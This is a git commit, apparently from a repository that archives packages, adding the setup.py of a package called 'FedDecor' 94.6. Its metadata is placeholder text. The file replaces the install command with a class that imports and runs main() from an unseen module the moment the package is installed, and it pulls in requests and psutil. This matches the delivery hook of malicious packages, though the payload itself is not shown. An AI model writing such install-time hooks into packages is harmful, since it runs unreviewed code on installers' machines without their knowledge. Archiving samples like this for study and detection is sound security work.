e06f64e81fb85d72eb32251d9d1747506e480538
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-12-06 09:06:59 +0000

    Add package FedDecor/94.6/feddecor-94.6.tar.gz

---
+++ packages/FedDecor/feddecor-94.6.tar.gz/feddecor-94.6/setup.py
@@ -0,0 +1,24 @@
+from setuptools import setup, find_packages
+from setuptools.command.install import install
+
+
+class CrazyInstallStrat(install):
+    def run(self):
+        install.run(self)
+        from main import main
+        main()
+
+setup(
+    name="FedDecor",
+    version="94.6",
+    author="x",
+    author_email="xxx@outlook.com",
+    description="x",
+    long_description_content_type="text/markdown",
+    long_description="xxx",
+    cmdclass={
+        'install': CrazyInstallStrat,
+    },
+    install_requires=['requests', 'psutil'],
+    setup_requires=['setuptools']
+)
